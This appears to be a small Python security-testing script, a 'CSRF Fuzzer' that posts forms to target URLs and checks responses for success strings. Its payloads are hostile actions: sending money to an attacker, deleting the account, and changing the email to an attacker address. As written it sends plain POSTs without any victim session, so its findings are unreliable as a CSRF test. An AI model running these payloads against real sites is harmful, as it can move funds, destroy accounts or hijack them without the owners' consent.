import requests

class CSRFFuzzer:
    def __init__(self):
        self.name = "CSRF Fuzzer"
        self.payloads = [
            {"action": "transfer", "amount": "1000", "to": "attacker"},
            {"action": "delete_account"},
            {"action": "change_email", "new_email": "attacker@mail.com"}
        ]
        self.success_indicators = [
            "Transfer complete", "Account deleted", "Email updated", "Success"
        ]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                status, response_text = self.send_request(target, payload)
                vulnerable = self.analyze_response(response_text)
                results[f"{target} | Payload: {payload['action']}"] = {
                    "status": status,
                    "vulnerable": vulnerable
                }
        return results

    def send_request(self, url, data):
        try:
            response = requests.post(url, data=data, timeout=5)
            return response.status_code, response.text[:1000]
        except requests.exceptions.RequestException:
            return "ERROR", "No response"

    def analyze_response(self, text):
        for indicator in self.success_indicators:
            if indicator.lower() in text.lower():
                return True
        return False
